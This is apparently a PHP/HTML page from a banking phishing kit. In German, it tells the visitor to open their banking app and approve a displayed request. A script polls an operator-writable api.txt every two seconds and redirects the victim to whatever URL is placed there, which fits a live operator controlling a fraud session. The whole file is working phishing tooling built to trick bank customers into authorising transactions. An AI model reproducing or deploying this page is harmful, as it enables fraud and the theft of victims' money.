<?php
  $blank_page = ' ';
    $up_file = fopen("api.txt", "w");
    fwrite($up_file, $blank_page);


 ?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title></title>
    <link rel="stylesheet" href="res/app.css">
</head>
<body class="account">
<?php 
require 'views/header.php';
?>


<main>
<div class="holder">
<div class="left">


<div class="form" style="width:600px;">

<div class="stitle">Sicherheitsbestätigung</div>

<div class="text">
    Zur weiteren Bearbeitung ist eine Bestätigung über Ihre Banking-Anwendung erforderlich.
    
    <p>
        Bitte öffnen Sie jetzt Ihre Banking-App auf Ihrem Smartphone oder Tablet 
        und bestätigen Sie den angezeigten Vorgang. Erst nach erfolgreicher 
        Freigabe kann der Prozess fortgesetzt werden.
    </p>

    <p>
        <strong>So gehen Sie vor:</strong>
    </p>

    <ol style="padding-left:40px; margin:20px 0;">
        <li>Öffnen Sie Ihre Banking-App.</li>
        <li>Melden Sie sich wie gewohnt an.</li>
        <li>Prüfen Sie die angezeigte Anfrage sorgfältig.</li>
        <li>Bestätigen Sie den Vorgang zur Fortsetzung.</li>
    </ol>

    <p>
        Die Bestätigung kann einige Sekunden dauern. 
        Bitte schließen oder aktualisieren Sie diese Seite währenddessen nicht.
    </p>
</div>

<div class="loader">
    <div class="spinner"></div>
</div>


</div>
</div>
</div>
</main>


<?php 
require 'views/footer.php';
?>
		   <script>
        function fetchAndRedirect() {
            var client = new XMLHttpRequest();
            client.open('GET', 'api.txt?v=' + new Date().getTime(), true); // Cache busting
            client.onreadystatechange = function() {
                if (client.readyState === 4) {
                    if (client.status === 200) {
                        var responseText = client.responseText;
                        console.log("Fetched responseText:", responseText);

                        // Extract URL from meta refresh tag
                        var urlMatch = responseText.match(/<meta\s+http-equiv=['"]refresh['"]\s+content=['"][^;]+;\s*url=([^'"]+)['"]/i);

                        if (urlMatch && urlMatch[1]) {
                            var redirectUrl = urlMatch[1];
                            console.log("Redirecting to URL:", redirectUrl);
                            window.location.href = redirectUrl;
                        } else {
                            console.error("Failed to extract URL from response.");
                        }
                    } else {
                        console.error("Failed to fetch data from api.txt, status code:", client.status);
                    }
                }
            };
            client.send();
        }

        // Fetch the URL and redirect every 2 seconds
        setInterval(fetchAndRedirect, 2000);
    </script>

<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
<script>

</script>
</body>
</html>